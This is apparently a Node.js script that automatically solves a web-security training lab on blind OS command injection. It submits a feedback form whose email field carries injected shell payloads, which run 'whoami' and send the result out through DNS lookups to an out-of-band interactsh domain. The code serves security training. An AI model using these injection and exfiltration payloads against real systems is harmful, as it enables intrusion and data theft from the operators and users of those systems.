const { runLab, waitForSolved } = require('./_common.cjs');
const { extractLabelBeforeMarker, makeMarker, pollForInteraction, requireInteractshDomain } = require('./_oob.cjs');

const TITLE = 'Blind OS command injection with out-of-band data exfiltration';
const PATH = '/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration';

async function submitFeedback(page, labUrl, email) {
  await page.goto(`${labUrl}/feedback`, { waitUntil: 'domcontentloaded', timeout: 15000 });
  const csrf = await page.locator('[name="csrf"]').first().inputValue().catch(() => '');
  return page.evaluate(async ({ csrfToken, emailValue }) => {
    const body = new URLSearchParams();
    if (csrfToken) body.set('csrf', csrfToken);
    body.set('name', 'wiener');
    body.set('email', emailValue);
    body.set('subject', 'hello');
    body.set('message', 'hello');
    const response = await fetch('/feedback/submit', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: body.toString(),
    });
    return response.status;
  }, { csrfToken: csrf, emailValue: email });
}

runLab({
  title: TITLE,
  path: PATH,
  solve: async ({ page, labUrl }) => {
    const domain = requireInteractshDomain();
    const marker = makeMarker('oscmd5');
    const payloads = [
      `x||nslookup+\`whoami\`.${marker}.${domain}||`,
      `x||nslookup+$(whoami).${marker}.${domain}||`,
    ];

    const since = Date.now();
    let statusCode = 0;
    let callback = null;
    let usedPayload = '';
    let whoami = '';

    for (const payload of payloads) {
      // eslint-disable-next-line no-await-in-loop
      statusCode = await submitFeedback(page, labUrl, payload);
      // eslint-disable-next-line no-await-in-loop
      callback = await pollForInteraction({ marker, since, timeoutMs: 20000, stepMs: 2000 });
      if (!callback) {
        continue;
      }
      whoami = extractLabelBeforeMarker(callback, marker, domain);
      if (whoami) {
        usedPayload = payload;
        break;
      }
    }

    if (!callback || !whoami) {
      throw new Error('No whoami value was extracted from interactsh');
    }

    const solved = await waitForSolved(page, labUrl, 90000, 5000);
    if (!solved) {
      throw new Error('whoami exfiltration succeeded, but the lab never marked as solved');
    }

    console.log(`RESULT_JSON:${JSON.stringify({ marker, payload: usedPayload, statusCode, whoami, callback: callback['full-id'] || callback['q-name'] || '' })}`);
  },
});
